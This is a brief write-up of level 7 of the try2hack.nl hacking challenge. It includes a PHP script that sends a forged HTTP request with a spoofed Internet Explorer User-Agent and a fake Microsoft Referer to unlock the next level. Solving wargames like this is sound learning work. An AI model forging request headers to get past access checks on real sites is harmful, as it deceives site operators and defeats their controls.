#### Level 7

After I figured out that this level was broken, it was quite easy. The server first require that you use IE 7.66.
I made a php script which sends a HTTP request where I set the user-agent to meet the requirements.
Then the server complains about not using Unix or Linux, and so it wants you to be refered from a microsoft site.
When the server is happy it gives you the URL to level 8.

This is the php script I made:
```php
<?php

if (!$socket = fsockopen('try2hack.nl', 80, $errno, $errstr, 20)) {
    print $errno . "-" . $errstr;
} 
else {
    $out = "GET /levels/level7-xfkohc.php HTTP/1.1\r\n";
    $out .= "Host: try2hack.nl\r\n";
    $out .= "User-Agent: Mozilla/4.0 (compatible;MSIE 7.66;Linux)\r\n";
    $out .= "Referer: http://www.microsoft.com/ms.htm\r\n";
    $out .= "Connection: Close\r\n\r\n";
    fwrite($socket, $out);
    while (!feof($socket)) {
        print fgets($socket, 2046);
    }
    fclose($socket);
}

?>
```